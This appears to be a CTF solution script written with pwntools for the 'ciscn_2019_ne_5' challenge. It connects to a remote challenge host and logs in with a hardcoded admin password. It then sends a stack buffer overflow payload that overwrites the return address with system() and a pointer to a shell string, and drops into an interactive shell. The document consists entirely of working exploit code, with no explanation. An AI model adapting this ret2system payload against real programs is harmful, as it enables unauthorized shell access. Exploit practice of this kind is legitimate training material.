from pwn import *


print(int(0x7c))  # s1 124
print(int(0xfc))  # src 252
print(int(0x48))  # dest 72

context.log_level = 'debug'

r = remote('node5.buuoj.cn', 27623)
# r = process(r'./ciscn_2019_ne_5')

system_addr = 0x80484D0
bash_addr = 0x80482E6 + 0x04

r.sendlineafter('Please input admin password:', b'administrator')
r.sendlineafter('0.Exit\n:', '1')

payload = b'A' * (0x48 + 4) + p32(system_addr) + b'a' * 4 + p32(bash_addr)
r.sendlineafter('Please input new log info:', payload)

r.recvuntil('0.Exit\n:')
r.sendline('4')
r.interactive()
# print(r.recvall())